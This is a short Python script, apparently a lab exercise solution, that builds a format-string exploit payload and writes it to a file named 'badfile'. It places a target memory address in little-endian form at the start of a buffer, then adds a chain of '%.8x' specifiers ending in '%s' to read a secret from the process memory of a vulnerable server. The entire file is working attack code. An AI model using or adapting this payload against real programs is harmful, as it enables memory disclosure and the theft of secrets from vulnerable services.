#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# Secret message address (replace with the actual address from the server printout)
secret_message_address = 0x080b4008  # Example address

# Store the address of the secret message at the start of the buffer
# Remember to use little-endian format
content[0:4] = (secret_message_address).to_bytes(4, byteorder='little')

# Construct the format string to print out the data at the secret message address
# Number of %x specifiers before the %s, adjust as needed
number_of_specifiers = 10  # Adjust based on the position of the secret message address in the stack
format_string = "%.8x " * number_of_specifiers + "%s"

# Store the format string in the buffer
fmt = format_string.encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(content)

print("Payload written to badfile.")

